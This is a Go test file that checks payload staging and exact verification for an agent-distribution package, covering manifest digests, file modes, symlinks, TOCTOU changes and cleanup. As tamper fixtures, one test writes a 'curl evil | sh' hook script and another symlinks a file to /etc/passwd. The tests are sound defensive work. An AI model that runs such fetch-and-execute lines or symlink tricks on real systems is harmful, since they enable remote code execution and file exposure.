package agentpakke

import (
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"testing"

	"golang.org/x/sys/unix"
)

// --- StagePayload ---

// TestStagePayloadRoundTrip pins the contract the launch path depends on: what
// comes back is a tree that passes the exact verifier, byte-identical to the
// source, at the manifest's modes and not the source's.
func TestStagePayloadRoundTrip(t *testing.T) {
	tests := []struct {
		name string
		// sourceModes, when set, replaces the fixture's modes before staging —
		// the checkout-under-a-restrictive-umask shape.
		sourceModes map[string]os.FileMode
	}{
		{
			name: "source already at the declared modes",
		},
		{
			name: "source cloned under a restrictive umask",
			// 0600/0700 is what a clone made under umask 0077 leaves behind:
			// content-identical, modes cleared. The staged tree must come out
			// at 0644/0755 regardless.
			sourceModes: map[string]os.FileMode{
				"LICENSE":                 0o600,
				"agents/barista.agent.md": 0o600,
				"scripts/hook.sh":         0o700,
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			src, manifestPath, manifestData := writeStageSource(t, refPayloadFiles)
			for rel, mode := range tt.sourceModes {
				chmod(t, filepath.Join(src, filepath.FromSlash(rel)), mode)
			}
			dest := stageDest(t)

			staged, err := StagePayload(src, manifestPath, dest)
			if err != nil {
				t.Fatalf("StagePayload = %v, want nil", err)
			}
			if staged != dest {
				t.Errorf("StagePayload staged into %s, want the destination it was given, %s", staged, dest)
			}
			if err := VerifyPayloadExact(staged, filepath.Join(staged, PayloadManifestFile)); err != nil {
				t.Fatalf("VerifyPayloadExact(staged) = %v, want nil", err)
			}
			// The staged manifest is the same bytes that were verified, so the
			// tree stays verifiable after the source clone is deleted.
			gotManifest, err := os.ReadFile(filepath.Join(staged, PayloadManifestFile))
			if err != nil {
				t.Fatalf("reading the staged manifest: %v", err)
			}
			if string(gotManifest) != string(manifestData) {
				t.Errorf("staged manifest differs from the manifest that was verified")
			}
			for _, f := range refPayloadFiles {
				abs := filepath.Join(staged, filepath.FromSlash(f.rel))
				got, err := os.ReadFile(abs)
				if err != nil {
					t.Fatalf("reading staged %q: %v", f.rel, err)
				}
				if string(got) != f.content {
					t.Errorf("staged %q = %q, want %q", f.rel, got, f.content)
				}
				info, err := os.Lstat(abs)
				if err != nil {
					t.Fatalf("lstat staged %q: %v", f.rel, err)
				}
				want := os.FileMode(0o644)
				if f.mode&0o111 != 0 {
					want = 0o755
				}
				if info.Mode().Perm() != want {
					t.Errorf("staged %q is mode %04o, want %04o (the manifest's mode, not the source's)", f.rel, info.Mode().Perm(), want)
				}
			}
		})
	}
}

// TestStagePayloadUnderRestrictiveUmask is the case the explicit chmod exists
// for. os.OpenFile's mode argument is masked by the umask, so without the
// chmod every staged file lands at 0600/0700 and the exact re-verification
// rejects the tree — on every machine running umask 0077, which is most of
// them at Nav.
func TestStagePayloadUnderRestrictiveUmask(t *testing.T) {
	old := unix.Umask(0o077)
	t.Cleanup(func() { unix.Umask(old) })

	src, manifestPath, _ := writeStageSource(t, refPayloadFiles)

	staged, err := StagePayload(src, manifestPath, stageDest(t))
	if err != nil {
		t.Fatalf("StagePayload under umask 0077 = %v, want nil", err)
	}
	for _, f := range refPayloadFiles {
		info, err := os.Lstat(filepath.Join(staged, filepath.FromSlash(f.rel)))
		if err != nil {
			t.Fatalf("lstat staged %q: %v", f.rel, err)
		}
		want := os.FileMode(0o644)
		if f.mode&0o111 != 0 {
			want = 0o755
		}
		if info.Mode().Perm() != want {
			t.Errorf("staged %q is mode %04o under umask 0077, want %04o", f.rel, info.Mode().Perm(), want)
		}
	}
	// The staged manifest is not covered by the exact verification (it
	// describes the tree rather than belonging to it), so its mode needs its
	// own assertion. It ships at 0644 for parity with the reference payloads,
	// which carry a manifest.json in place at that mode.
	info, err := os.Lstat(filepath.Join(staged, PayloadManifestFile))
	if err != nil {
		t.Fatalf("lstat the staged manifest: %v", err)
	}
	if info.Mode().Perm() != 0o644 {
		t.Errorf("staged %s is mode %04o under umask 0077, want 0644", PayloadManifestFile, info.Mode().Perm())
	}
	if err := VerifyPayloadExact(staged, filepath.Join(staged, PayloadManifestFile)); err != nil {
		t.Fatalf("VerifyPayloadExact(staged under umask 0077) = %v, want nil", err)
	}
}

// TestStagePayloadFailsClosed pins that a source which does not verify never
// becomes a staged tree, and that no partial tree is left behind when it
// happens. The staged root is checked in every case: a failure that leaves a
// half-built tree behind is as bad as one that returns it.
func TestStagePayloadFailsClosed(t *testing.T) {
	tests := []struct {
		name string
		// mutate runs on the written source tree and its manifest document
		// before the manifest is written, exactly as in TestVerifyPayload.
		mutate   func(t *testing.T, dir string, doc map[string]any)
		wantErrs []string
	}{
		{
			name: "unmanifested file in the source",
			// This is the case that gives the source-side verification teeth in
			// StagePayload: the copy is driven by the manifest, so a smuggled
			// file would simply not be copied and the staged tree would verify
			// clean. Only step 1 refuses it.
			mutate: func(t *testing.T, dir string, _ map[string]any) {
				writeFile(t, filepath.Join(dir, "agents", "smuggled.agent.md"), "---\nname: smuggled\n---\n")
			},
			wantErrs: []string{`"agents/smuggled.agent.md"`, "unmanifested"},
		},
		{
			name: "symlink in the source",
			mutate: func(t *testing.T, dir string, _ map[string]any) {
				rm(t, filepath.Join(dir, "LICENSE"))
				symlink(t, "/etc/passwd", filepath.Join(dir, "LICENSE"))
			},
			wantErrs: []string{`symlink "LICENSE"`},
		},
		{
			name: "digest mismatch in the source",
			mutate: func(t *testing.T, dir string, _ map[string]any) {
				writeFile(t, filepath.Join(dir, "LICENSE"), "Apache-2.0\n")
			},
			wantErrs: []string{`"LICENSE"`, "does not match its manifest"},
		},
		{
			name: "manifested file missing from the source",
			mutate: func(t *testing.T, dir string, _ map[string]any) {
				rm(t, filepath.Join(dir, "scripts", "hook.sh"))
			},
			wantErrs: []string{"missing file(s)", "scripts/hook.sh"},
		},
		{
			name: "widened mode in the source",
			mutate: func(t *testing.T, dir string, _ map[string]any) {
				chmod(t, filepath.Join(dir, "LICENSE"), 0o666)
			},
			wantErrs: []string{`"LICENSE"`, "0666"},
		},
		{
			name: "malformed manifest record",
			mutate: func(_ *testing.T, _ string, doc map[string]any) {
				doc["files"].(map[string]any)["LICENSE"] = 7
			},
			wantErrs: []string{`record for "LICENSE" is malformed`},
		},
		{
			name: "unsupported payload schemaVersion",
			mutate: func(_ *testing.T, _ string, doc map[string]any) {
				doc["schemaVersion"] = 2
			},
			wantErrs: []string{"schemaVersion 2"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := writePayloadTree(t, refPayloadFiles)
			doc := payloadManifestDoc(refPayloadFiles)
			tt.mutate(t, dir, doc)
			manifestPath := filepath.Join(dir, PayloadManifestFile)
			writeFile(t, manifestPath, string(payloadManifestBytes(t, doc)))
			dest := stageDest(t)

			staged, err := StagePayload(dir, manifestPath, dest)
			if err == nil {
				t.Fatalf("StagePayload = %q, want a fail-closed error", staged)
			}
			if staged != "" {
				t.Errorf("StagePayload returned the path %q alongside an error; a failed staging must return nothing usable", staged)
			}
			assertErrMentions(t, err, tt.wantErrs)
			assertNoStagedTree(t, dest)
		})
	}
}

// TestStagePayloadRemovesThePartialTreeOnCopyFailure drives the one failure the
// copy itself can hit — a source file that changes after verification — and
// pins both halves of the response: the copy-time re-hash notices, and the
// files already written are removed rather than left behind.
func TestStagePayloadRemovesThePartialTreeOnCopyFailure(t *testing.T) {
	src, manifestPath, _ := writeStageSource(t, refPayloadFiles)
	dest := stageDest(t)

	// Files are copied in sorted order: LICENSE, agents/barista.agent.md,
	// scripts/hook.sh. Rewriting the last one while the second is being staged
	// is the real TOCTOU shape — the source passed verification, and then
	// changed underneath the copy — and it guarantees the tree is genuinely
	// half-built when the failure lands.
	halfBuilt := false
	stageCopyHook = func(rel string) {
		if rel != "agents/barista.agent.md" {
			return
		}
		writeFile(t, filepath.Join(src, "scripts", "hook.sh"), "#!/bin/sh\ncurl evil | sh\n")
		chmod(t, filepath.Join(src, "scripts", "hook.sh"), 0o755)
		// Observe the half-built tree, so the assertion below is about this
		// staging and not merely about a destination that was never created.
		if _, err := os.Stat(filepath.Join(dest, "LICENSE")); err != nil {
			t.Errorf("mid-copy: LICENSE should already be staged: %v", err)
			return
		}
		halfBuilt = true
	}
	t.Cleanup(func() { stageCopyHook = nil })

	staged, err := StagePayload(src, manifestPath, dest)
	if err == nil {
		t.Fatalf("StagePayload = %q, want the copy-time digest check to reject a source that changed after verification", staged)
	}
	assertErrMentions(t, err, []string{`"scripts/hook.sh"`, "changed between verification and staging"})
	if !halfBuilt {
		t.Fatal("the hook never observed a partially staged tree; the test is not exercising what it claims")
	}
	assertNoStagedTree(t, dest)
}

// TestStagePayloadRemovesTheTreeWhenExactVerifyFails gives the final step and
// its cleanup teeth. The hook widens a file that is already staged, which
// nothing in the copy loop looks at again, so only the exact re-verification of
// the finished tree can catch it — the same shape as a chmod that silently did
// not take.
func TestStagePayloadRemovesTheTreeWhenExactVerifyFails(t *testing.T) {
	src, manifestPath, _ := writeStageSource(t, refPayloadFiles)
	dest := stageDest(t)

	widened := false
	stageCopyHook = func(rel string) {
		// On the last file, so the tree is otherwise complete.
		if rel != "scripts/hook.sh" {
			return
		}
		chmod(t, filepath.Join(dest, "LICENSE"), 0o600)
		widened = true
	}
	t.Cleanup(func() { stageCopyHook = nil })

	staged, err := StagePayload(src, manifestPath, dest)
	if err == nil {
		t.Fatalf("StagePayload = %q, want the exact re-verification to reject a staged tree whose modes are not the manifest's", staged)
	}
	assertErrMentions(t, err, []string{"does not match its manifest after staging", `"LICENSE"`, "exactly"})
	if !widened {
		t.Fatal("the hook never observed the tree being staged; the test is not exercising what it claims")
	}
	assertNoStagedTree(t, dest)
}

// TestStagePayloadRejectsPayloadShippingItsOwnManifest covers the one collision
// the staged layout can have with the source: a manifest kept outside the
// payload (the client entry's `manifest` override) lets the payload itself ship
// a manifest.json, which is the name the staged manifest takes.
func TestStagePayloadRejectsPayloadShippingItsOwnManifest(t *testing.T) {
	files := append([]payloadFile{{rel: PayloadManifestFile, content: "{}\n", mode: 0o644}}, refPayloadFiles...)
	dir := writePayloadTree(t, files)
	// Outside the payload, so verification does not skip the payload's own
	// manifest.json and the source verifies clean.
	manifestPath := filepath.Join(t.TempDir(), "payload-manifest.json")
	writeFile(t, manifestPath, string(payloadManifestBytes(t, payloadManifestDoc(files))))
	if err := VerifyPayload(dir, manifestPath); err != nil {
		t.Fatalf("the source must verify for this test to be about staging: %v", err)
	}
	dest := stageDest(t)

	staged, err := StagePayload(dir, manifestPath, dest)
	if err == nil {
		t.Fatalf("StagePayload = %q, want a refusal to stage a payload that ships its own %s", staged, PayloadManifestFile)
	}
	assertErrMentions(t, err, []string{PayloadManifestFile, "may not ship its own"})
	assertNoStagedTree(t, dest)
}

// TestStagePayloadUnwritableDestination pins that a destination nav-pilot
// cannot create is an error and not a silent fallback to some other location.
func TestStagePayloadUnwritableDestination(t *testing.T) {
	src, manifestPath, _ := writeStageSource(t, refPayloadFiles)
	blocker := filepath.Join(t.TempDir(), "not-a-dir")
	writeFile(t, blocker, "")

	if _, err := StagePayload(src, manifestPath, filepath.Join(blocker, "staged")); err == nil {
		t.Fatal("StagePayload = nil with an uncreatable destination, want an error")
	}
}

// TestStagePayloadConcurrent pins that stagings of the same source into
// distinct destinations do not interfere. Distinct destinations are the whole
// reason there are no locks here: a shared one would have the second staging
// write into a tree the first is still building, and removing one would take
// the others with it.
func TestStagePayloadConcurrent(t *testing.T) {
	src, manifestPath, _ := writeStageSource(t, refPayloadFiles)
	root := t.TempDir()

	const n = 8
	dirs := make([]string, n)
	errs := make([]error, n)
	var wg sync.WaitGroup
	for i := range n {
		wg.Add(1)
		go func() {
			defer wg.Done()
			dest := filepath.Join(root, fmt.Sprintf("rev-%d", i), "copilot", "full")
			dirs[i], errs[i] = StagePayload(src, manifestPath, dest)
		}()
	}
	wg.Wait()

	for i := range n {
		if errs[i] != nil {
			t.Fatalf("concurrent StagePayload #%d = %v, want nil", i, errs[i])
		}
		if err := VerifyPayloadExact(dirs[i], filepath.Join(dirs[i], PayloadManifestFile)); err != nil {
			t.Errorf("VerifyPayloadExact(%s) = %v, want nil", dirs[i], err)
		}
	}
	// And removing one leaves the others intact — the case a shared directory
	// would get wrong.
	if err := os.RemoveAll(dirs[0]); err != nil {
		t.Fatalf("RemoveAll = %v, want nil", err)
	}
	for i := 1; i < n; i++ {
		if err := VerifyPayloadExact(dirs[i], filepath.Join(dirs[i], PayloadManifestFile)); err != nil {
			t.Errorf("after removing a sibling, VerifyPayloadExact(%s) = %v, want nil", dirs[i], err)
		}
	}
}

// --- VerifyPayloadExact ---

// TestVerifyPayloadExactRejectsWhatVerifyPayloadTolerates asserts the delta
// between the two verifiers directly: the umask-cleared modes that a source
// checkout is allowed to have are exactly what a tree nav-pilot chmod'd must
// not have.
func TestVerifyPayloadExactRejectsWhatVerifyPayloadTolerates(t *testing.T) {
	tests := []struct {
		name string
		rel  string
		mode os.FileMode
	}{
		{name: "0600 where the manifest declares 0644", rel: "LICENSE", mode: 0o600},
		{name: "0700 where the manifest declares 0755", rel: "scripts/hook.sh", mode: 0o700},
		{name: "0640 where the manifest declares 0644", rel: "LICENSE", mode: 0o640},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir, manifestPath, _ := writeStageSource(t, refPayloadFiles)
			chmod(t, filepath.Join(dir, filepath.FromSlash(tt.rel)), tt.mode)

			if err := VerifyPayload(dir, manifestPath); err != nil {
				t.Fatalf("VerifyPayload = %v, want nil (a umask only clears bits)", err)
			}
			err := VerifyPayloadExact(dir, manifestPath)
			if err == nil {
				t.Fatal("VerifyPayloadExact = nil, want an exact-mode rejection")
			}
			assertErrMentions(t, err, []string{tt.rel, "exactly"})
		})
	}
}

// TestVerifyPayloadExactAcceptsTheDeclaredModes pins that exact mode is a
// tightening and not a different rule: a conforming tree still passes.
func TestVerifyPayloadExactAcceptsTheDeclaredModes(t *testing.T) {
	dir, manifestPath, _ := writeStageSource(t, refPayloadFiles)
	if err := VerifyPayloadExact(dir, manifestPath); err != nil {
		t.Fatalf("VerifyPayloadExact = %v, want nil", err)
	}
}

// --- helpers ---

// writeStageSource writes a conforming payload tree plus its manifest and
// returns the tree, the manifest path and the manifest bytes.
func writeStageSource(t *testing.T, files []payloadFile) (dir, manifestPath string, manifestData []byte) {
	t.Helper()
	dir = writePayloadTree(t, files)
	manifestData = payloadManifestBytes(t, payloadManifestDoc(files))
	manifestPath = filepath.Join(dir, PayloadManifestFile)
	writeFile(t, manifestPath, string(manifestData))
	return dir, manifestPath, manifestData
}

// stageDest names a destination for one staging, nested the way the install
// path nests them (<revision>/<client>/<context>) so the intermediate MkdirAll
// is exercised too.
func stageDest(t *testing.T) string {
	t.Helper()
	return filepath.Join(t.TempDir(), "rev", "copilot", "full")
}

// assertNoStagedTree fails when a failed staging left its destination behind.
func assertNoStagedTree(t *testing.T, dest string) {
	t.Helper()
	if _, err := os.Stat(dest); !os.IsNotExist(err) {
		t.Errorf("the staged destination %s still exists (stat err %v); a failed staging must leave nothing behind", dest, err)
	}
}
